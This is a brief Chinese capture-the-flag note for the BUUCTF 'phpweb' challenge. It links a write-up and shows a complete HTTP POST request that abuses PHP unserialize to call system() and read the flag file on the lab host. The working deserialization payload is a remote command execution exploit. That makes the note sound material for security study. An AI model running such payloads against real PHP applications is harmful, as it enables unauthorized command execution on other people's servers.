# WP
[BUUCTF：[网鼎杯 2020 朱雀组]phpweb_末 初的博客-CSDN博客](https://blog.csdn.net/mochu7777777/article/details/116060210)
# 知识点
`readfile`、`file_get_contents`读取文件<br />反序列化进行命令执行
```http
POST /index.php HTTP/1.1
Host: dd77db5c-9c2d-4806-a259-8bb3e8964535.node4.buuoj.cn:81
Content-Length: 96
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dd77db5c-9c2d-4806-a259-8bb3e8964535.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dd77db5c-9c2d-4806-a259-8bb3e8964535.node4.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```
